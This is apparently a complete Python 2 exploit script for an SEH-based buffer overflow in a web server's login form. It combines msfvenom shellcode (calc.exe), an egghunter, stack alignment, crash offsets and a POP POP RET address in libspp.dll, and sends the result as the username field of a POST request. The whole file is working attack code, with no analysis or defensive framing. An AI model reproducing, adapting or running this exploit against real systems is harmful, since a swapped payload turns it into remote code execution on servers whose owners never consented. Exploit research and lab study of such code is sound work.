#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b "\x0a\x0d\x00\x26" exitfunc=thread
# Payload size: 220 bytes
shellcode =  ""
shellcode += "\xbd\x4f\xa5\x42\xfe\xdd\xc0\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x31\x31\x6b\x13\x83\xeb\xfc\x03\x6b"
shellcode += "\x40\x47\xb7\x02\xb6\x05\x38\xfb\x46\x6a\xb0\x1e"
shellcode += "\x77\xaa\xa6\x6b\x27\x1a\xac\x3e\xcb\xd1\xe0\xaa"
shellcode += "\x58\x97\x2c\xdc\xe9\x12\x0b\xd3\xea\x0f\x6f\x72"
shellcode += "\x68\x52\xbc\x54\x51\x9d\xb1\x95\x96\xc0\x38\xc7"
shellcode += "\x4f\x8e\xef\xf8\xe4\xda\x33\x72\xb6\xcb\x33\x67"
shellcode += "\x0e\xed\x12\x36\x05\xb4\xb4\xb8\xca\xcc\xfc\xa2"
shellcode += "\x0f\xe8\xb7\x59\xfb\x86\x49\x88\x32\x66\xe5\xf5"
shellcode += "\xfb\x95\xf7\x32\x3b\x46\x82\x4a\x38\xfb\x95\x88"
shellcode += "\x43\x27\x13\x0b\xe3\xac\x83\xf7\x12\x60\x55\x73"
shellcode += "\x18\xcd\x11\xdb\x3c\xd0\xf6\x57\x38\x59\xf9\xb7"
shellcode += "\xc9\x19\xde\x13\x92\xfa\x7f\x05\x7e\xac\x80\x55"
shellcode += "\x21\x11\x25\x1d\xcf\x46\x54\x7c\x85\x99\xea\xfa"
shellcode += "\xeb\x9a\xf4\x04\x5b\xf3\xc5\x8f\x34\x84\xd9\x45"
shellcode += "\x71\x7a\x90\xc4\xd3\x13\x7d\x9d\x66\x7e\x7e\x4b"
shellcode += "\xa4\x87\xfd\x7e\x54\x7c\x1d\x0b\x51\x38\x99\xe7"
shellcode += "\x2b\x51\x4c\x08\x98\x52\x45\x6b\x7f\xc1\x05\x42"
shellcode += "\x1a\x61\xaf\x9a"

# Bad characters: 0x0a 0x0d 0x26
badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
"\x23\x24\x25\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43"
"\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
"\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
"\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3"
"\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3"
"\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

# Egghunter ODOR
egghunt = (
            "\x66\x81\xCA\xFF\x0F"      # or dx,0xfff
            "\x42"                      # inc edx
            "\x52"                      # push edx
            "\x6A\x02"                  #  push byte
            "\x58"                      # pop eax
            "\xCD\x2E"                  # int 0x2e
            "\x3C\x05"                  # cmp al,0x5
            "\x5A"                      # pop edx
            "\x74\xEF"                  # jz 0x0
            "\xB8\x52\x4F\x44\x4F"      # mov eax,0x524F444F        # Tag "ODOR"
            "\x8B\xFA"                  # mov edi,edx
            "\xAF"                      # scasd
            "\x75\xEA"                  # jnz 0x5
            "\xAF"                      # scasd
            "\x75\xE7"                  # jnz 0x5
            "\xFF\xE7"                  # jmp edi
)

# Eggstring
egg = "ODOR"[::-1] * 2

# Align ESP
align_esp = (    "\x54"                          # PUSH ESP
                    "\x58"                          # POP EAX
                    "\x66\x05\x40\x13"              # ADD AX, 0x1340
                    "\x50"                          # PUSH EAX
                    "\x5c"                          # POP ESP
                )

# Maximum length
maxlength = 20000

# Offsets
crash_ebp = 2070
crash_ecx = 1960
crash_nseh = 14278
crash_seh = crash_nseh + 4

# Offset for negative jmp's
offset_jmp_1 = 14186
offset_jmp_2 = 32

# Negative jump after first jump
neg_jmp_2 = "\xe9\xb1\xc8\xff\xff"                      # E9B1C8FFFF        jmp 0xffffc8b6  # JMP's back to begin of buffer

# NOP's
nop = "\x90" * 8

# Crafting payload variables
prefix = "A" * offset_jmp_2
#prefix += nop
#prefix += egghunt
prefix += egg
prefix += nop
prefix += shellcode
prefix += "B" * (offset_jmp_1 - len(prefix))
#prefix += neg_jmp_2
prefix += egghunt
prefix += "C" * (crash_nseh - len(prefix))
# nseh = struct.pack("<L", 0xa0774c4c)                    # DEC ESP # DEC ESP # JNO 0x3 # Jumps 0x80 back on ESP
nseh = struct.pack("<L", 0x0beb9090)                    # JMP # NOP # NOP
seh = struct.pack("<L", 0x100159be)                     # POP POP RET # libspp.dll
suffix = "D" * (maxlength - len(prefix + nseh + seh))

payload = prefix + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."

    
        req = (
                "POST /login HTTP/1.1\r\n"
                "Host: " + host + ":" + str(port) + "\r\n"
                "User-Agent: hodorweb\r\n"
                "Connection: close\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-us,en;q=0.5\r\n"
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                "Keep-Alive: 300\r\n"
                "Proxy-Connection: keep-alive\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 17000\r\n\r\n"
                "username=admin" + payload + "&password=12345\r\n\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.recv(1024)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()

